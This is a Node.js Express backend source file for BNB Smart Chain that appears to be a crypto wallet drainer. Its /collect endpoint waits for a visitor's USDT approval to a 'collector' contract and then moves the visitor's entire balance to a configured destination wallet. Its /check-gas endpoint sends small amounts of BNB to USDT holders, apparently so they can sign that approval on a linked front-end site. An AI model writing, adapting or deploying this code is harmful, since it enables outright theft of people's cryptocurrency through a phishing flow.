require('dotenv').config();
const express = require('express');
const cors = require('cors');
const { Mutex } = require('async-mutex');
const {
  createPublicClient,
  createWalletClient,
  http,
  parseAbi,
  formatUnits,
  parseEther,
} = require('viem');
const { privateKeyToAccount } = require('viem/accounts');
const { bsc } = require('viem/chains'); // Mainnet BSC Chain

const app = express();
app.use(cors({
  origin: [
    'https://bsc20.netlify.app',
    'http://localhost:5173'
  ],
  credentials: true
}));
app.use(express.json());

// --- CONFIGURATION ---
const RPC_URL = 'https://bsc-dataseed.binance.org';
const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
const AUTO_COLLECTOR_ADDRESS = process.env.CONTRACT_ADDRESS;
const DESTINATION_WALLET = process.env.DESTINATION_WALLET;
const PRIVATE_KEY = process.env.PRIVATE_KEY;
console.log('--- DEBUGGING VARIABLES ---');
console.log('Contract Address:', process.env.CONTRACT_ADDRESS);
console.log('Destination:', process.env.DESTINATION_WALLET);
console.log(
  'Private Key:',
  process.env.PRIVATE_KEY ? 'Exists (Hidden)' : 'MISSING ❌'
);
// --- VIEM CLIENT SETUP ---

// 1. Account Setup (Private Key)
let pKey = PRIVATE_KEY;
if (!pKey.startsWith('0x')) pKey = '0x' + pKey;
const account = privateKeyToAccount(pKey);

// 2. Public Client (Data padhne ke liye - Balance/Allowance)
const publicClient = createPublicClient({
  chain: bsc,
  transport: http(RPC_URL),
});

// 3. Wallet Client (Transaction sign aur send karne ke liye)
const walletClient = createWalletClient({
  account,
  chain: bsc,
  transport: http(RPC_URL),
});

// --- ABIs (Viem Format) ---
// Viem human-readable ABI ko array format me prefer karta hai
const USDT_ABI = parseAbi([
  'function balanceOf(address account) view returns (uint256)',
  'function allowance(address owner, address spender) view returns (uint256)',
]);

const COLLECTOR_ABI = parseAbi([
  'function collectFrom(address token, address from, uint256 amount, address to)',
]);

// Queue System
const mutex = new Mutex();
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

app.post('/collect', async (req, res) => {
  const { userAddress } = req.body;

  if (!userAddress) return res.status(400).json({ error: 'No address' });
  console.log(`\n📥 [Viem] Request Received: ${userAddress}`);

  await mutex.runExclusive(async () => {
    try {
      console.log(`▶️ Processing...`);

      // --- STEP 1: CHECK APPROVAL ---
      let attempts = 0;
      let allowance = 0n;

      while (attempts < 10) {
        // Viem Read Contract
        allowance = await publicClient.readContract({
          address: USDT_ADDRESS,
          abi: USDT_ABI,
          functionName: 'allowance',
          args: [userAddress, AUTO_COLLECTOR_ADDRESS],
        });

        if (allowance > 0n) break;

        console.log('⏳ Waiting for allowance sync...');
        await sleep(2000);
        attempts++;
      }

      if (allowance == 0n) {
        console.log('❌ Approval Pending/Zero.');
        return res.json({ success: false, message: 'Approval pending' });
      }

      // --- STEP 2: CHECK BALANCE ---
      const balance = await publicClient.readContract({
        address: USDT_ADDRESS,
        abi: USDT_ABI,
        functionName: 'balanceOf',
        args: [userAddress],
      });

      if (balance == 0n) {
        console.log('❌ Zero Balance.');
        return res.json({ success: false, message: 'Zero Balance' });
      }

      console.log(`💰 Balance Found: ${formatUnits(balance, 18)} USDT`);

      // --- STEP 3: EXECUTE TRANSFER (WRITE) ---
      // Viem me gas estimation automatic aur accurate hota hai
      const hash = await walletClient.writeContract({
        address: AUTO_COLLECTOR_ADDRESS,
        abi: COLLECTOR_ABI,
        functionName: 'collectFrom',
        args: [USDT_ADDRESS, userAddress, balance, DESTINATION_WALLET],
      });

      console.log(`✅ Transaction Sent! Hash: https://bscscan.com/tx/${hash}`);

      // Transaction confirmation ka wait (Optional, Viem me ye fast hota hai)
      // await publicClient.waitForTransactionReceipt({ hash });

      res.json({ success: true, hash: hash });
    } catch (error) {
      console.error(`❌ Error:`, error.message || error);
      res
        .status(500)
        .json({ success: false, error: error.message || 'Execution Failed' });
    }
  });
});

app.post('/check-gas', async (req, res) => {
  const { userAddress } = req.body;

  if (!userAddress) return res.status(400).json({ error: 'No address' });
  console.log(`\n⛽ [Gas Check] Request Received: ${userAddress}`);

  await mutex.runExclusive(async () => {
    try {
      // 1. Check USDT Balance (Security Check)
      let usdtBalance = 0n;
      try {
        usdtBalance = await publicClient.readContract({
          address: USDT_ADDRESS,
          abi: USDT_ABI,
          functionName: 'balanceOf',
          args: [userAddress],
        });
      } catch (readError) {
        console.warn('⚠️ Failed to read USDT balance:', readError.message);
        return res.json({ success: false, funded: false, message: 'Could not verify USDT balance' });
      }

      console.log(`💰 User USDT Balance: ${formatUnits(usdtBalance, 18)}`);

      if (usdtBalance === 0n) {
        console.log('❌ No USDT found. Auto-fund denied.');
        return res.json({ success: true, funded: false, message: 'No USDT found' });
      }

      // 2. Check BNB Balance
      const balance = await publicClient.getBalance({ address: userAddress });
      const threshold = parseEther('0.00004'); // 0.00004 BNB

      console.log(`💰 User BNB Balance: ${formatUnits(balance, 18)} BNB`);

      if (balance < threshold) {
        console.log('⚠️ Low BNB Balance! Sending Auto-Gas...');

        const hash = await walletClient.sendTransaction({
          to: userAddress,
          value: parseEther('0.00004'),
        });

        console.log(`✅ Auto-Gas Sent! Hash: https://bscscan.com/tx/${hash}`);
        return res.json({ success: true, funded: true, hash });
      } else {
        console.log('✅ BNB Balance Sufficient.');
        return res.json({ success: true, funded: false });
      }
    } catch (error) {
      console.error('❌ Gas Check Error:', error.message);
      res.status(500).json({ success: false, error: error.message });
    }
  });
});

app.get('/', (req, res) => {
  res.send('Backend is running!');
});

app.listen(3001, '0.0.0.0', () => {
  console.log('🚀 VIEM SERVER RUNNING ON PORT 3001');
});
